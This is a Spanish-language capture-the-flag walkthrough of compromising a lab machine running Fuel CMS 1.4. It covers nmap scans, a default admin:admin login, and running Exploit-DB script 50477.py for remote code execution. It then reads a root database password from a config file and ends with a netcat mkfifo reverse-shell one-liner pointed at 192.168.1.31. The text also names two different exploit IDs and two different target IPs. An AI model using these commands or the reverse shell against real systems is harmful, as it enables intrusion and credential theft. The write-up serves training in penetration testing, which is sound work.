
- IP victima `10.10.100.241`

## Comprobar si tengo conexión
```
ping -c 1 10.10.100.241
```
![](img/Pasted%20image%2020241030180823.png)
>ℹ
>		*Tenemos conexión con la máquina*



# Reconocimiento

## NMAP
```
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.100.241 -oN basic_scan
```
![](img/Pasted%20image%2020241030182625.png)

# ENUMERACIÓN

## NMAP
```
nmap -p80 -sVC --min-rate 5000 -n -Pn -vvv 10.10.100.241 -oN ports_scan
```
![](img/Pasted%20image%2020241030182842.png)
![](img/Pasted%20image%2020241030182825.png)



### Puerto 80
- Voy al navegador para dar un vistazo al servidor web
![](img/Pasted%20image%2020241030182959.png)
![](img/Pasted%20image%2020241030183017.png)
![](img/Pasted%20image%2020241030183031.png)
>ℹ
>		*Vemos varias cosas interesante.
>		- Primero vemos que es un CMS con al versión 1.4, y es como un tutorial como para instalar el CMS llamado FUEL.
>		- Tenemos listadas varias rutas que permiten escribir
>		- Nos muestra archivos de configuraciones
>		- Y al final una URL con usuario y contraseñas predeterminadas para entrar como administrador*




- #### Visito URL
- En la web tenemos la siguiente información
 ![](img/Pasted%20image%2020241030183431.png)
>ℹ
>	*No indica que en la ruta `http://10.10.100.241/fuel` podemos loguearnos como administradores con las credenciales `admin:admin`*	


- Visitio la URL	 
![](img/Pasted%20image%2020241030183624.png)
>ℹ
>	* Tenemos un login, el cual introduzco las credenciales que tenemos `admin:admin`*

![](img/Pasted%20image%2020241030183723.png)
>ℹ
>	*Estamos dentro del gestor CMS Fuel*



## Explotación

- Buscamos un exploit para la versión de este CMS
```
searchsploit fuel
```
![](img/Pasted%20image%2020241030184736.png)


- Usamos el primero `47138`, asi que lo descargamos
```
searchsploit -m 50477.py
```
![](img/Pasted%20image%2020241030210914.png)

- Vemos el código del exploit
```
cat 50477.py
```
![](img/Pasted%20image%2020241030211003.png)
![](img/Pasted%20image%2020241030211026.png)
>ℹ
>	*Este script es un exploit de ejecución remota de código (RCE) diseñado para aprovechar una vulnerabilidad en **Fuel CMS 1.4.1 o versiones anteriores**. Permite al atacante ejecutar comandos del sistema en el servidor en el que está alojado Fuel CMS y ver los resultados en la consola.
>
		Propósito:
		El exploit se conecta a un servidor que ejecuta Fuel CMS vulnerable y permite:
		- Verificar la conexión al servidor.
		- Enviar comandos al servidor y recibir su salida.
>	 
>	 Esto puede dar al atacante acceso no autorizado para manipular y obtener información del servidor remoto, dependiendo de los permisos del servidor y del usuario bajo el que corre Fuel CMS*



- Ejecuto el exploit
```
python3 50477.py -u http://10.10.135.11
```
![](img/Pasted%20image%2020241030211445.png)
>ℹ
>	*Vemos que obtuvimos conexión con el servidor*



- Compruebo algún comando
```
whoami
```
![](img/Pasted%20image%2020241030211540.png)
>ℹ
>	*Se ejecuta el comando propuesto*


- Como podemos ejecutar cualquier comandos, podemos ver información del sistema, por ejemplo:
```
cat fuel/application/config/database.php
```
![](img/Pasted%20image%2020241030212204.png)
>ℹ
>	*Obtenemos la contraseña del usuario `root`*



- Sabemos cómo iniciar sesión como root, pero no tenemos forma de hacerlo. Tenemos que tratar de conseguir una shell en el sistema para poder cambiar nuestro usuario a root. Antes de eso, sin embargo, vamos a ver si podemos enviar la bandera de usuario usando esta interfaz de comando.
```
ls /home/www-data
```
![](img/Pasted%20image%2020241030212408.png)

- Vemos el contenido del fichero enumerado
```
cat /home/www-data/flag.txt
```
![](img/Pasted%20image%2020241030212611.png)
>ℹ
>	*Tenemos la bandera de usuario, ahora nos movemos para entrar en el sistema.*




Necesitamos una manera de conseguir una reverse shell, "sudo -l". Pero como tenemos ejecución remota de comandos, podemos intentar lanzarnos una `reverse shell`, por me dio de netcat.


- Ponemos a la escucha netcat
```
nc -nlvp 1234
```
![](img/Pasted%20image%2020241101214532.png)


- En la ejecución remota de comandos podemos ejecutar el código:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.31 1234 >/tmp/f
```
